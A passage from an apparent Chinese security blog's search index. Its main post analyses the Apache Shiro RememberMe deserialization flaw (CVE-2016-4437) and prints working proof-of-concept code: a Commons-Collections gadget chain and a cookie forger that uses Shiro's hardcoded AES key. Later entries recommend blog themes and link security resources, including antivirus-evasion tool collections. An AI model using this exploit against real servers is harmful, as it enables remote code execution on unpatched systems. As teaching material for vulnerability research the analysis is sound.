&#123;\n                    return null;\n                &#125; else if (base64 !&#x3D; null) &#123;\n                    base64 &#x3D; this.ensurePadding(base64);\n                    if (log.isTraceEnabled()) &#123;\n                        log.trace(&quot;Acquired Base64 encoded identity [&quot; + base64 + &quot;]&quot;);\n                    &#125;\n\n                    byte[] decoded &#x3D; Base64.decode(base64);\n                    if (log.isTraceEnabled()) &#123;\n                        log.trace(&quot;Base64 decoded byte array length: &quot; + (decoded !&#x3D; null ? decoded.length : 0) + &quot; bytes.&quot;);\n                    &#125;\n\n                    return decoded;\n                &#125; else &#123;\n                    return null;\n                &#125;\n            &#125;\n        &#125;\n    &#125;\n\n在该方法中，主要实现了获取 Cookie 中的内容并通过 Base64 解码，然后返回 byte 数组的功能。\n漏洞分析漏洞环境已经上传到 github 中：https://github.com/dota-st/vulnEnv\n先简单了解一下该漏洞的原理：\n当用户登录勾选remember me的时候，Shiro 会将当前用户的 Cookie 信息序列化后进行 AES 加密存储在 Cookie 的 RememberMe 字段中，在下次请求时会读取 Cookie 中的 RememberMe 字段并进行 AES 解密然后反序列化。\n然而通过前面的AbstractRememberMeManager类我们知道，AES 加解密的 KEY 是硬编码在该类中的，因此当我们知道 KEY之后，可以伪造 RememberMe 字段进而触发反序列化漏洞。\n那么我们便开始一步步跟着调试吧，打上断点，在 Cookie 添加 RememberMe 字段然后发送请求。\n在\t#getRememberedPrincipals()方法中将上下文数据传入到getRememberedSerializedIdentity()方法中\n接着会跳转到CookieRememberMeManager#getRememberedSerializedIdentity()方法中\n可以看到readValue()方法会从请求中获取RememberMe字段的值，最后通过Base64.decode()解码后返回 byte 数组，接着又回到getRememberedPrincipals()方法\n继续跟进convertBytesToPrincipals()方法，调用decrypt()方法进行解密\n继续跟进decrypt()方法\n这里调用到getDecryptionCipherKey()方法，我们跟进一下\n这里到了AbstractRememberMeManager#getDecryptionCipherKey()方法，前面我们提到过该类，在这里获取到了硬编码的秘钥。\n接着decrypt()方法走完 return 了serialized字节数组，最后调用了deserialize()方法\n继续跟进deserialize()方法，跟着调用了getSerializer().deserialize()方法\n继续跟进getSerializer().deserialize()方法\n可以看到，这里通过ByteArrayInputStream()获取了输入流，最后调用readObject()方法进行反序列化。\n回顾梳理一下流程：\n\n传入RememberMe字段，获取该字段的值；\n对RememberMe进行 Base64 解码，然后调用硬编码的 KEY 进行解密；\n对解密后的内容进行反序列化。\n\n编写 POC在 pom.xml 文件里添加了CommonCollections和javassist依赖，以完成反序列化的利用演示。\n这里通过前面我们学习的CommonsCollections11链子生成恶意文件\npackage com.serialize;\n\nimport com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport javassist.ClassClassPath;\nimport javassist.ClassPool;\nimport javassist.CtClass;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.keyvalue.TiedMapEntry;\nimport org.apache.commons.collections.map.LazyMap;\n\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Field;\nimport java.util.HashMap;\nimport java.util.Map;\n\n&#x2F;**\n * Created by dotast on 2022&#x2F;10&#x2F;12 15:50\n *&#x2F;\npublic class CommonsCollections11 &#123;\n    public static void main(String[] args) throws Exception&#123;\n        CommonsCollections11 commonsCollections11 &#x3D; new CommonsCollections11();\n        commonsCollections11.serialize();\n    &#125;\n    public void serialize() throws Exception&#123;\n        String cmd &#x3D; &quot;Runtime.getRuntime().exec(\\&quot;open -a Calculator.app\\&quot;);&quot;;\n        &#x2F;&#x2F; 创建evailClass\n        ClassPool pool &#x3D; ClassPool.getDefault();\n        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));\n        CtClass evailClass &#x3D; pool.makeClass(&quot;evailClass&quot;);\n        &#x2F;&#x2F; 将代码插进static&#123;&#125;\n        evailClass.makeClassInitializer().insertBefore(cmd);\n        evailClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));\n        &#x2F;&#x2F; 转换成字节码\n        byte[] classBytes &#x3D; evailClass.toBytecode();\n        byte[][] targetByteCodes &#x3D; new byte[][]&#123;classBytes&#125;;\n        &#x2F;&#x2F; 反射修改\n        TemplatesImpl templates &#x3D; TemplatesImpl.class.newInstance();\n        Field bytecodes &#x3D; templates.getClass().getDeclaredField(&quot;_bytecodes&quot;);\n        bytecodes.setAccessible(true);\n        bytecodes.set(templates, targetByteCodes);\n\n        Field name &#x3D; templates.getClass().getDeclaredField(&quot;_name&quot;);\n        name.setAccessible(true);\n        name.set(templates, &quot;name&quot;);\n\n        Field _class &#x3D; templates.getClass().getDeclaredField(&quot;_class&quot;);\n        _class.setAccessible(true);\n        _class.set(templates, null);\n\n        &#x2F;&#x2F; 创建恶意的调用链\n        InvokerTransformer invokerTransformer &#x3D; new InvokerTransformer(&quot;toString&quot;,new Class[0], new Object[0]);\n        Map innerMap &#x3D; new HashMap&lt;&gt;();\n        Map outerMap &#x3D; LazyMap.decorate(innerMap, invokerTransformer);\n        &#x2F;&#x2F; 创建TiedMapEntry实例\n        TiedMapEntry tiedMapEntry &#x3D; new TiedMapEntry(outerMap,templates);\n        Map expMap &#x3D; new HashMap&lt;&gt;();\n        expMap.put(tiedMapEntry,&quot;valueTest&quot;);\n        outerMap.remove(templates);\n        &#x2F;&#x2F; 通过反射修改iMethodName值为newTransformer\n        Field f &#x3D; invokerTransformer.getClass().getDeclaredField(&quot;iMethodName&quot;);\n        f.setAccessible(true);\n        f.set(invokerTransformer, &quot;newTransformer&quot;);\n        FileOutputStream fileOutputStream &#x3D; new FileOutputStream(&quot;1.txt&quot;);\n        &#x2F;&#x2F; 创建并实例化对象输出流\n        ObjectOutputStream out &#x3D; new ObjectOutputStream(fileOutputStream);\n        out.writeObject(expMap);\n\n    &#125;\n    \n&#125;\n\n根据对应的AbstractRememberMeManager#encrypt()方法编写加密\npackage com.shiro;\n\nimport com.sun.org.apache.xerces.internal.impl.dv.util.Base64;\nimport org.apache.shiro.crypto.AesCipherService;\nimport org.apache.shiro.util.ByteSource;\n\nimport java.io.ByteArrayOutputStream;\nimport java.io.FileInputStream;\nimport java.io.InputStream;\n\n&#x2F;**\n * Created by dotast on 2022&#x2F;10&#x2F;10 10:45\n *&#x2F;\npublic class Shiro550 &#123;\n    public static void main(String[] args) throws Exception &#123;\n        String path &#x3D; &quot;1.txt&quot;;\n        byte[] key &#x3D; Base64.decode(&quot;kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;&quot;);\n        AesCipherService aes &#x3D; new AesCipherService();\n        ByteSource ciphertext &#x3D; aes.encrypt(getBytes(path), key);\n        System.out.printf(ciphertext.toString());\n    &#125;\n\n\n    public static byte[] getBytes(String path) throws Exception&#123;\n        InputStream inputStream &#x3D; new FileInputStream(path);\n        ByteArrayOutputStream byteArrayOutputStream &#x3D; new ByteArrayOutputStream();\n        int n &#x3D; 0;\n        while ((n&#x3D;inputStream.read())!&#x3D;-1)&#123;\n            byteArrayOutputStream.write(n);\n        &#125;\n        byte[] bytes &#x3D; byteArrayOutputStream.toByteArray();\n        return bytes;\n\n    &#125;\n&#125;\n\n运行后获得构造的恶意RememberMe字段内容，添加到 Cookie 中发送请求，成功弹出计算器。\nShiro 与 CC6在Commons-Collections11的时候曾提过Commons-Collections6这条链子在 shiro 中使用会报错，但如果你用Commons-Collections6生成的 POC 在我上面搭的环境会发现依然能正常弹出计算器，并没有出现报错，这是为什么呢？\n在上述环境使用的依赖是shiro-spring，也就是用 Spring-boot 构建的 Shiro\n&lt;dependency&gt;\n            &lt;groupId&gt;org.apache.shiro&lt;&#x2F;groupId&gt;\n            &lt;artifactId&gt;shiro-spring&lt;&#x2F;artifactId&gt;\n            &lt;version&gt;1.2.4&lt;&#x2F;version&gt;\n&lt;&#x2F;dependency&gt;\n\nShiro 的原生依赖只用到了：shiro-core和shiro-web，那么Spring构建的Shiro和原生的Shiro有什么不同呢？\n我们使用原生环境调调看，这里直接去 Shiro 的仓库下载，然后修改一下 pom.xml 文件即可，下面用到的环境也上传到前面提到的 github 仓库了。运行后访问主页，使用CommonCollections6的 POC 发送请求\n并没有弹出计算器，再回来看看 idea\n报错了，具体错误如下：\nCaused by: org.apache.shiro.util.UnknownClassException: Unable to load class named [[Lorg.apache.commons.collections.Transformer;] from the thread context, current, or system&#x2F;application ClassLoaders.  All heuristics have been exhausted.  Class could not be found.\n\n翻译过来大体意思就是Transformer类找不到，我们跟一下反序列化的入口点看看\n这里可以看到最后用的是ClassResolvingObjectInputStream类返回输入流，而不是常规的ObjectInputStream类，跟进该类\n在ClassResolvingObjectInputStream类中继承了ObjectInputStream类并且重写了resolveClass()方法，跟进ClassUtils.forName()方法又继续调用了loadClass()方法，其中参数值为[Lorg.apache.commons.collections.Transformer;\n这里的格式是JNI字段描述符，[表示数组，L代表类描述符，;表示类名到这里结束。\n接着继续跟进loadClass()方法\n可以看到这里调用的ClassLoader为ParallerWebappClassLoader，接着到loadClass()方法，这里接着跟进需要添加 tomcat 的源码才能继续进行调试（这里是偷懒做法，如果想食用更佳，移步Tomcat源码调试）\n导入 tomcat 的 jar 包之后继续跟进loadClass()方法进入到了WebappClassLoaderBase#loadClass()\n玩下走到findLoadedClass0()方法\nfindLoadedClass0()方法去缓存中查找是否存在，从跟的结果上得到是不存在，继续往下走到 this.findLoadedClass()方法\n依然为null，后面的跟着几个方法都是为 null，我们略去，到最后一步关键处，也就是到了Class.forName()方法\n这里可以看到，此时的父加载器为URLClassLoader\n其中ucp是URLClassLoader类的字段，ucp的成员path是一个 ArrayList 对象，存储着类的搜索路径。而这里这些路径全都是 tomcat 下的 lib 目录文件，并没有commons-collections的依赖文件。\n下面贴上在Class.forName()方法后的 debug 过程视频（因为写成文字描述过于繁琐就贴上视频）\n\n\n\n\n\n\n\n\n\n视频挂了，有需要的右下角发邮件给我》\n在 debug 视频中可以看到，传进Class.forName()方法的参数 name 为[Lorg.apache.commons.collections.Transformer;，接着后面走到findLoadedClass()方法时还原成了正常的org.apache.commons.collections.Transformer，因此有些文章在跟到前面时就断定是先前的[Lorgxxx格式导致无法找到的结论并不准确，这并不是最终过程。\n此外，可以看到ClassLoader的加载过程为AppClassLoader –&gt; ExtClassLoader –&gt; BootstrapClassLoa·der，均搜索不到org.apache.commons.collections.Transformer。\n搜索不到后抛出ClassNotFoundException的异常\n\n\n因此和之前的报错对应上了，那么为什么 spring 构建的 shiro 没有报错正常弹出计算器了呢？\n我们继续调试一下\n在该环境中，加载的ClassLoader为TomcatEmbeddedWebappClassLoader，而不是之前 shiro 原生环境的ParallerWebappClassLoader。\n继续跟进loadClass()方法，跳到了TomcatEmbeddedWebappClassLoader#loadClass()方法\n继续往下走，直到Class.forName()方法\n可以看到此时的父加载器为AppClassLoader系统类加载器，再看看此时的 path\n此时的 path 不再是 tomcat 下的，而是 java 环境中的，包含了commons-collections依赖，因此可以成功加载到\n这也解释了为什么在 spring 构建的 Shiro 环境中Commons-Collections6可以打成功，而原生的 Shiro 环境却报错失败的情况。\n至于为什么 path 会不一样，父类加载器也不一样，尝试跟了一下，实在过于复杂，遂暂时放弃，调试到此。\n等哪一天知识储备足够了，再来解惑。\n漏洞修复在 Shiro 1.2.5 版本的更新中，用户需要手动配置 CipherKey，如果不设置，将会动态生成一个 CipherKey。但反序列化流程没有修改，这也是 Shiro 至今依然在各大 HW 演练中频繁出现的原因。\n\n\n\n\n\n\n\n\n\n原创作者地址：https://github.com/dota-st/vulnEnv\n","slug":"CVE-2016-4437","date":"2021-11-09T16:18:15.000Z","categories_index":"Java安全","tags_index":"Java安全","author_index":"Akpigs"},{"id":"66b65759df9f8ae35f6c9a2b2a4db094","title":"主题推荐","content":"不错的Hexo主题推荐vuepress-aurora：vuepress-theme-aurora 是一款基于 Vuepress2 的博客主题，将本地 Markdown 文件解析成静态 html 页面，作为博客文章。搭配 说说，时间轴，文章分类，评论，友情链接，相册，音乐播放器 等特色功能，给您不一样的使用体验。\n🏆100%自定义\n🌈简洁，漂亮\n🎨高扩展\n💫多功能\n📖配置文档\n\nhttps://github.com/vuepress-aurora/vuepress-theme-aurora\n在线演示：https://aurora.xcye.xyz/\n\nVdoingvuepress-theme-vdoing 是一款简洁高效的 VuePress 知识管理&amp;博客主题。它以 Markdown 为中心的项目结构，内置自动化工具，以更少的配置完成更多的事。配合多维索引快速定位每个知识点，可以作为知识库也可以作为博客系统；其包含三种典型的知识管理形态：结构化、碎片化、体系化。轻松打造属于你自己的知识管理平台；专为阅读设计的UI，配合多种颜色模式、可关闭的侧边栏和导航栏，带给你一种沉浸式阅读体验。\n🚀知识管理\n🌈简洁高效\n📖沉浸式阅读\n\nGithub地址：https://github.com/xugaoyi/vuepress-theme-vdoing\nGitee镜像：https://gitee.com/xugaoyi/vuepress-theme-vdoing\n文档地址：https://doc.xugaoyi.com/\n知识库兼博客站：https://xugaoyi.com/\n仅博客站：https://xugaoyi.github.io/vdoing-demo-blog/\n仅知识库：https://xugaoyi.github.io/vdoing-demo-repository/\n\nHopevuepress-theme-hope 一个具有强大功能的 vuepress 主题✨。V2 基于 VuePress2，带有 Vite2 &#x2F; Webpack5和 Vue3 的强大功能。\n更丰富的内容\nMarkdown 增强\n页面 UI\n完整的博客支持\n搜索功能\n搜索引擎增强\n\nGithub地址：https://github.com/vuepress-theme-hope/vuepress-theme-hope\nFork地址：https://stackblitz.com/fork/vuepress-theme-hope\n文档地址：https://vuepress-theme-hope.github.io/v2/zh/\n在线案例：https://mister-hope.github.io/\n\nButterfly（超级推荐）hexo-theme-butterfly 一个为 Hexo 打造的简洁、漂亮、快速的主题。\n\n\n\n\n\n\n\n\n\n相关教程特多特详细，自定义化强，但是需要会一些前端基础\n之前搭建过，用久后觉得挺花里胡哨的，还是简约看着舒服🤓😅\n简单漂亮，文章内容美观易读，\nMaterial Design 设计\n响应式设计，博客在桌面端、平板、手机等设备上均能很好的展现\n瀑布流式的博客文章列表（文章无特色图片时会有 24 张漂亮的图片代替）\n时间轴式的归档页\n丰富的关于我页面（包括关于我、文章统计图、我的项目、我的技能、相册等）\n可自定义的数据的友情链接页面\n支持文章置顶和文章打赏\n支持 MathJax\n可设置复制文章内容时追加版权信息\nGitalk、Gitment、Valine 和 Disqus 评论模块\n集成了不蒜子统计、谷歌分析（Google Analytics）和文章字数统计等功能\n支持在首页的音乐播放和视频播放功能\n\nGithub地址：https://github.com/jerryc127/hexo-theme-butterfly\n文档地址：https://butterfly.js.org/posts/21cfbf15/\n预览地址：https://tzy1997.com/\n魔改资源：\nhttps://butterfly.zhheo.com/\nhttps://akilar.top/tags/\nhttps://anzhiy.cn/tags/\nhttps://blog.zhheo.com/tags/Hexo/\nhttps://www.chuckle.top/tags/Butterfly/\nhttps://blog.leonus.cn/categories/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/\nhttps://tzy1997.com/tags/Hexo/\nhttps://blog.imzjw.cn/tags/Butterfly/\nhttps://blog.eurkon.com/tags/Butterfly/\nhttps://hassanwong.top/tags/%F0%9F%A6%8BButterfly/\nhttps://zhu-dongya.gitee.io/archives/\n\n\n\nHexo Aurora（本站所用）hexo-theme-aurora 是使用极光颜色和 UI 元素的下一代主题。它给你平滑流畅的色彩和未来感。基于 Vue3 构建，享受由 Vue3 建立的单页面应用（SPA）所带来的更优雅，更友好的用户体验。\nNEW NPM&#x2F;Yarn 快速安装 - 可以轻易的使用 NPM 或者 Yarn 安装主题。\n推荐区域 - 可以在文章的 meta 中添加 feature 属性，让头 3 篇文章指定到首页推荐位置。\n实时多语言支持 - 可以实时切换博客内主要文字的语言。\n数据统计 - 统计文字数、文章数、分类数和标签数。\n文章阅读时长 - 每个文章都会显示文章的预估阅读时长。\nMathjax 支持 - 支持在 markdown 中写 Maxjax 语法的数学公式。\n单页面应用 - 页面与页面之间的跳转没有延迟或者等待，数据都是动态加载的。\n评论插件 - 支持使用 Gitalk 或者 Valine 评论插件\n文章搜索 - 可以搜索全站的所有文章\n文章导航 - 可以在文章详情底部跳转到上一篇或者下一篇文章。\n最新评论 - 给首页添加一个最新评论模块，支持使用 gitalk 或者 valine。\n\nGithub地址：https://github.com/auroral-ui/hexo-theme-aurora\n文档地址：https://aurora.tridiamond.tech/zh/\n预览地址：https://tridiamond.tech/\n\nVolantisVolantis 是一个功能丰富、高度模块化的 Hexo 博客主题。得益于其强大的模块化特性，您可以轻松搭建一个极简风格的博客，也可以仿照官网搭建一个多人协作的、包含文档模块的大体量综合型博客。\n\nGithub地址：https://github.com/volantis-x/hexo-theme-volantis\n文档地址：https://volantis.js.org/v6/getting-started/\n预览地址：https://volantis.js.org/\n\nFlyhexo-blog-fly 基于 Hexo 框架搭建，用到 hexo-theme-matery 主题,并在此基础之上做了很多修改，修复了一些 bug，增加了一些新的特性和功能，其在原主题的基础上新增了许多实用的功能。\n\nGithub地址：https://github.com/shw2018/hexo-blog-fly\n文档地址：https://sunhwee.com/posts/6e8839eb.html\n预览地址：https://sunhwee.com/\n\nNexmoehexo-theme-nexmoe 基于 Hexo 开发，其支持图片瀑布流、自定义主题颜色、内置&#x2F;外置搜索、侧栏备案信息、网页访问统计、支持多款评论插件、内置多语言、图片懒加载、社交按钮等功能。\n图片瀑布流\n图片瀑布流 Pro\n灯箱大图\n自定义主题颜色\n闪亮的归档页面\n漂亮的友情链接页面\n内置&#x2F;外置搜索\n侧栏备案信息\n网页访问统计\n支持多款评论插件\n内置多语言\n图片懒加载\n社交按钮\n\nGithub地址：https://github.com/theme-nexmoe/hexo-theme-nexmoe\n文档地址：https://docs.nexmoe.com/\n预览地址：https://nexmoe.com/\n\nShoka\nGitHub地址：https://github.com/amehime/hexo-theme-shoka\n\n文档地址：https://shoka.lostyu.me/computer-science/note/theme-shoka-doc/\n\n预览地址：https://shoka.lostyu.me/\n\n\nbamboo直接用\n\nGitHub地址：https://github.com/yuang01/hexo-theme-bamboo\n文档地址：https://yuang01.github.io/post/hexo-theme-bamboo-new/\n预览地址：\n配置一：https://yuang01.github.io/post/hexo-theme-bamboo-new/\n配置二：https://yuang01.github.io/post/hexo-theme-bamboo-new/\n配置三：https://yuang01.github.io/post/hexo-theme-bamboo/theme/\n配置四：https://yuang01.github.io/post/hexo-theme-bamboo/front-matter/\n配置五：https://yuang01.github.io/post/hexo-theme-bamboo/front-matter/\n配置六：https://yuang01.github.io/post/hexo-theme-bamboo/suggest/\n配置七：https://yuang01.github.io/post/hexo-theme-bamboo/sidebar/#%E9%BB%98%E8%AE%A4%E7%9A%84%E4%BE%A7%E8%BE%B9%E6%A0%8F\n\n\n\n","slug":"Hexo主题推荐","date":"2021-06-22T14:28:13.000Z","categories_index":"","tags_index":"资源推荐","author_index":"Akpigs"},{"id":"f5866dfa5c622e30663074315795c4d8","title":"JavaSE tutorial","content":"","slug":"JavaSE-tutorial","date":"2021-06-02T08:42:47.000Z","categories_index":"JavaBasic","tags_index":"Java,JavaSE","author_index":"Akpigs"},{"id":"c59d1c706dbef939f46c10d621fda176","title":"Javaweb tutorial","content":"\nclick here see more\n\n\n\n\n\n\n\n\n\nhttps://www.yuque.com/qingkongxiaguang/javaweb/hkgbvo#f58b5357\n\n\n","slug":"Javaweb-tutorial","date":"2021-05-02T08:43:40.000Z","categories_index":"Java后端","tags_index":"Java,JavaWeb","author_index":"Akpigs"},{"id":"382400db20d50f8c4a3ead6fea1a314f","title":"Welcome come to  Akpig's Blog","content":"\n\n\n\n\n\n\n\n\nIf you are reading this article, hexo has been successfully built, please take it a step further\nWelcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nHome、About、Archives、Tags、Links、Message Board、More、\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n\n","slug":"hello-world","date":"2021-02-23T08:50:14.000Z","categories_index":"TestBlog","tags_index":"First Page","author_index":"Akpigs"},{"id":"db8ececde0a48c813879a1c92a0b7bcc","title":"简易导航","content":"\n\n\n\n\n\n\n\n\n下述的内容均收集于互联网，旅行者，本破站点旨在原创文章记录学习经历&amp;&amp;收集优秀资源减少学习成本，如果您又更好的想法请联系我。让我们一起传承开源精神🤓……\n值得推荐的网站——信息安全信息安全在线文件检查分析\n微步在线云沙箱\n病毒总数                    \n腾讯哈勃分析系统                    \nVirSCAN.org - 免费的多引擎在线病毒扫描程序v1.02，支持47个防病毒引擎！                    \n未知威胁文件检测系统-安芯网盾-免费的在线病毒检测分析平台，连续十年为Google VirusTotal提供服务                    \n360安全大脑沙箱云                    \nMetaDefender Cloud | Advanced threat prevention and detection                    \n关于Jotti的恶意软件扫描系统                    \n卡巴斯基威胁情报门户 — 分析                    \n恶意软件分析 &amp; URL链接扫描 免费在线病毒分析平台 | 魔盾安全分析                    \nFree Automated Malware Analysis Service - powered by Falcon Sandbox                    \nIntezer Analyze – Security analysts’ trusted advisor                    \n奇安信情报沙箱                    \n大圣云沙箱检测系统                    \n安恒在线云沙盒\n\nH4ck Site Nav\nHack街-黑客街-黑客技术入门-黑客零基础入门导航-网络安全爱好者的安全导航 | 黑客                        \n\n渗透师 网络安全从业者安全导航                        \n\nCTF导航 | 分享CTF、IOT、ICS、Car相关内容                        \n\n安全圈info - 做接地气的信息安全导航                        \n\n【极牛导航】网络安全资源导航站                        \n\n安全导航 | 御网尚书的日记本\n\n\n技能路线\n知道创宇研发技能表v3.1 2016&#x2F;5&#x2F;18 发布 by @知道创宇(www.knownsec.com) @余弦 & 404团队 后续动态请关注微信公众号：Lazy-Thought                        \n安全技能 -SecWiki                        \njinengzhou.pdf                        \n漏洞银行(BUGBANK) 官方网站 | 领先的网络安全漏洞发现品牌 | 开放安全的提出者与倡导者 | 创新的漏洞发现平台                        \nGitHub - SecWiki&#x2F;sec-chart： 安全思维导图集合\n\n渗透测试渗透测试自学笔记\nhttps://websec.readthedocs.io/zh/latest/index.html\n\n信息收集\n相关搜索结果-天眼查                                \n企查查 - 企业工商信息查询系统_查企业_查老板_查风险就上企查查!                                \n站长工具 - 站长之家\n\n内网渗透\nGitHub - Ridter&#x2F;Intranet_Penetration_Tips: 2018年初整理的一些内网渗透TIPS，后面更新的慢，所以整理出来希望跟小伙伴们一起更新维护~\n\nWindows安全Linux安全硬件安全Web安全线下靶场搭建\nGitHub(DVWA)\nGitHub&#x2F;pikachu: 一个好玩的Web安全-漏洞测试平台\nGitHub&#x2F;upload-labs 0.1 \nGitHub&#x2F;Sqli-labs\n\n区块链安全二进制安全\n 0x00sec 安全社区- The Home of the Hacker\n\n免杀收集免杀的资料\n\nGitHub - TideSec&#x2F;BypassAntiVirus: 远控免杀系列文章及配套工具，汇总测试了互联网上的几十种免杀工具、113种白名单免杀方式、8种代码编译免杀、若干免杀实战技术，并对免杀效果进行了一一测试，为远控的免杀和杀软对抗免杀提供参考。                            \nCnHack3r (CnHack3r) · GitHub                            \nmidisec (Midi Wan) · GitHub                            \nH4de5-7 (H4de5-7) &#x2F; Repositories · GitHub\n\n漏洞利用\nExploit Database - Exploits for Penetration Testers, Researchers, and Ethical Hackers\n\n逆向破解红蓝队资源代码审计\n\nGitHub - Firebasky&#x2F;Java: 关于学习java安全的一些知识,正在学习中ing,欢迎fork and star                                    \nGitHub - ax1sX&#x2F;SecurityList: A list for Web Security and Code Audit                                    \nGitHub - j3ers3&#x2F;Hello-Java-Sec: ☕️ Java Security，安全编码和代码审计                                    \nGitHub  - threedr3am&#x2F;learnjavabug:  Java安全相关的漏洞和技术demo，原生Java、Fastjson、Jackson、Hessian2、XML反序列化漏洞利用和Spring、Dubbo、Shiro、CAS、Tomcat、RMI、Nexus等框架\\中间件\\功能的exploits以及Java  Security Manager绕过、Dubbo-Hessian2安全加固等等实践代码。                                    \nGitHub - Y4tacker&#x2F;JavaSec: a rep for documenting my study, may be from 0 to 0.1                                    \nGitHub - DjiangLiu&#x2F;JavaSecInterview: Java安全研究与安全开发面试题库，同是也是常见知识点的梳理和总结，包含问题和详细的答案，计划定期更新                                    \nAfant1 (Afant1) · GitHub                                \nAfant1 - 博客园\n\nJava\n风渐远 - Web安全与渗透测试学习笔记                                \nJava 全栈知识体系                                \n小简博客 - 小简的技术栈，专注Java及其他计算机技术、互联网技术教程                                \npanda | 热爱安全的理想少年                                \n大彩笔threedr3am                                \n学习路                                \n素十八                                \nSky’s 自留地                                \nTraLong’Blog – 菜狗之家                                \nHi 高虎                                \nTRRQ-信息安全博客                                \nfmyyy                                \nArsene.Tang\n\npython\nbit4woo&#x2F;python_sec: python安全和代码审计相关资料收集 resource collection of python security and code review                                \nYang’s Harbor\n\nGOPHP红蓝对抗信息安全知识库\n信息安全知识库 vipread.com\nWooYun知识库                            \n乌云drops – 永久存档 | 漏洞人生                           \n乌云 Drops 文章在线浏览\n\nCTF比赛[SycloverTeam · GitHub](https:&#x2F;&#x2F;github.com&#x2F;SycloverTeam)                            \n[jwt1399 (简简) · GitHub](https:&#x2F;&#x2F;github.com&#x2F;jwt1399)                            \n[Y4er (Y4er) · GitHub](https:&#x2F;&#x2F;github.com&#x2F;Y4er)                            \n[evilpan (evilpan) · GitHub](https:&#x2F;&#x2F;github.com&#x2F;evilpan)                            \n[Firebasky (Firebasky)](https:&#x2F;&#x2F;github.com&#x2F;Firebasky)                            \n[blackorbird (blackorbird) &#x2F; Repositories · GitHub](https:&#x2F;&#x2F;github.com&#x2F;blackorbird?tab&#x3D;repositories)                            \n[Jindom (Jindom) &#x2F; Repositories · GitHub](https:&#x2F;&#x2F;github.com&#x2F;Jindom?tab&#x3D;repositories)               \n[y1nglamore (颖奇L&#39;Amore) · GitHub](https:&#x2F;&#x2F;github.com&#x2F;y1nglamore)                            \n[ZeddYu (Zeddy) · GitHub](https:&#x2F;&#x2F;github.com&#x2F;ZeddYu)                            \n[firmianay (一蓑烟雨) · GitHub](https:&#x2F;&#x2F;github.com&#x2F;firmianay)                            \n[meizjm3i (梅子酒) · GitHub](https:&#x2F;&#x2F;github.com&#x2F;meizjm3i)                            \n[miaotony (MiaoTony) · GitHub](https:&#x2F;&#x2F;github.com&#x2F;miaotony)                            \n[VIDAR-TEAM · GitHub](https:&#x2F;&#x2F;github.com&#x2F;vidar-team)                            \n[EdenQwQ (Eden) · GitHub](https:&#x2F;&#x2F;github.com&#x2F;EdenQwQ)                            \n[lyleshaw (Lyle Shaw) · GitHub](https:&#x2F;&#x2F;github.com&#x2F;lyleshaw)                            \n[shw2018 (Hongwei Sun) · GitHub](https:&#x2F;&#x2F;github.com&#x2F;shw2018&#x2F;)                            \n[Aaisui (月石) · GitHub](https:&#x2F;&#x2F;github.com&#x2F;Aaisui)                            \n[qrzbing (Qin Ruizhe) · GitHub](https:&#x2F;&#x2F;github.com&#x2F;qrzbing)                            \n[IanSmith123 (Les1ie) · GitHub](https:&#x2F;&#x2F;github.com&#x2F;IanSmith123)                            \n[Xyntax (Xyntax) &#x2F; Repositories · GitHub](https:&#x2F;&#x2F;github.com&#x2F;Xyntax?tab&#x3D;repositories)               [Ascotbe (周雨晨) · GitHub](https:&#x2F;&#x2F;github.com&#x2F;Ascotbe)                            \n[dota-st (dota-st) &#x2F; Repositories · GitHub](https:&#x2F;&#x2F;github.com&#x2F;dota-st?tab&#x3D;repositories)          [bit4woo (bit4woo) · GitHub](https:&#x2F;&#x2F;github.com&#x2F;bit4woo)                            \n[Rvn0xsy (Rvn0xsy) &#x2F; Repositories · GitHub](https:&#x2F;&#x2F;github.com&#x2F;Rvn0xsy?tab&#x3D;repositories)         [squarepants0 · GitHub](https:&#x2F;&#x2F;github.com&#x2F;squarepants0)                            \n[0e0w · GitHub](https:&#x2F;&#x2F;github.com&#x2F;0e0w)                            \n[nszy007 (nszy007) &#x2F; Repositories · GitHub](https:&#x2F;&#x2F;github.com&#x2F;nszy007?tab&#x3D;repositories)          [Lz1y (Lz1y) &#x2F; Repositories · GitHub](https:&#x2F;&#x2F;github.com&#x2F;Lz1y?tab&#x3D;repositories)                     [NoSQL Injection - Payloads All The Things](https:&#x2F;&#x2F;swisskyrepo.github.io&#x2F;PayloadsAllTheThingsWeb&#x2F;NoSQL Injection&#x2F;)                           \n[SexyBeast233 · GitHub](https:&#x2F;&#x2F;github.com&#x2F;SexyBeast233)                               \n\nCTF导航\nCTF站点导航 | 猫捉鱼铃                            \nCTF程序猿工具箱CTF导航站|CTF工具|AWD PLUS|渗透测试|网络安全|信息安全CTF导航站点                            \nCTF导航 | 分享CTF、IOT、ICS、Car相关内容\n\nCTFWiki\n简介 - CTF Wiki\n\nCTF线上靶场\n首页 - Bugku CTF（推荐）\n攻防世界(推荐)\n北京长亭未来科技有限公司（大佬专属）\nctf.show\nTryHackMe | Cyber Security Training\nBurpsuite实验室\nBUUCTF（推荐）\nPWNTHEBOX（推荐）\n\n师傅们的网站红队大佬\n倾旋的博客                            \nAnonySec’Blog                            \nLionKing                            \n(5条消息) 谢公子的博客_CSDN博客-域环境渗透,网络安全工具使用集锦,linux系统安全领域博主                            \n(5条消息) 大方子的博客_CSDN博客-经验心得,技术分享,CTF领域博主                            \nTeamsSix                            \n小草窝博客                            \n浅蓝 ‘s blog                            \nGeekby’s Blog                            \ntr1ple - 博客园                            \nbitterz - 博客园                            \nBlog                            \nMr.Be1ieVe’s Treasure | Mr.Be1ieVe的博客 | Mr.Be1ieVe’s Blog                            \n学的越深越发现自己的渺小                            \n3gstudent-Blog                            \nConsT27’s Blog                            \nglzjin – 西兴街道物理安全研究员 &#x2F; Web手@W&amp;M &#x2F; 原学生@北京联合大学 &#x2F; 